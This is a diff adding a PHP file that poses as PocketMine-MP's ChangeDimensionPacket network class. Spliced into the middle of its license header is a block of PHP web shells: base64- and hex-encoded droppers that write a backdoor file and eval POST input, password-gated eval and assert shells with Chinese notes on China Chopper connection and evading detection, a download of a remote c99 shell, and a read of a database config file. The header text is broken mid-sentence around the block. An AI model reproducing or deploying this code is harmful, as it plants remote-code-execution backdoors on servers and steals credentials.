@@ -1,0 +1,116 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+<?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>
+生成：<?php @eval($_POST['lostwolf']);?>
+
+
+
+<script language="php">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));</script>
+
+
+
+
+
+<?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?>
+
+
+
+<script language="php">
+
+fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"));
+</script>
+
+
+
+
+
+
+//file:lostwolf.php
+//pass:lostwolf
+
+
+
+
+
+
+
+高强度密码：
+
+<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>
+
+  
+
+//菜刀提交  http://192.168.1.5/x.php?x=lostwolf  脚本类型:php  密码为 c
+
+
+
+
+
+<?php assert($_REQUEST["c"]);?>     //菜刀连接 躲避检测 密码c 
+
+
+
+下载远程shell
+
+<?php
+echo copy("http://www.r57.me/c99.txt","lostwolf.php");
+?> 
+
+
+
+<? echo file_get_contents("..//cfg_database.php");?> //显示某文件类容
+
+<? eval ( file_get_contents("远程shell")) ?> //运行远程shell * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\network\mcpe\protocol;
+
+#include <rules/DataPacket.h>
+
+use pocketmine\math\Vector3;
+use pocketmine\network\mcpe\NetworkSession;
+
+class ChangeDimensionPacket extends DataPacket{
+	public const NETWORK_ID = ProtocolInfo::CHANGE_DIMENSION_PACKET;
+
+	/** @var int */
+	public $dimension;
+	/** @var Vector3 */
+	public $position;
+	/** @var bool */
+	public $respawn = false;
+
+	protected function decodePayload(){
+		$this->dimension = $this->getVarInt();
+		$this->position = $this->getVector3();
+		$this->respawn = $this->getBool();
+	}
+
+	protected function encodePayload(){
+		$this->putVarInt($this->dimension);
+		$this->putVector3($this->position);
+		$this->putBool($this->respawn);
+	}
+
+	public function handle(NetworkSession $session) : bool{
+		return $session->handleChangeDimension($this);
+	}
+}
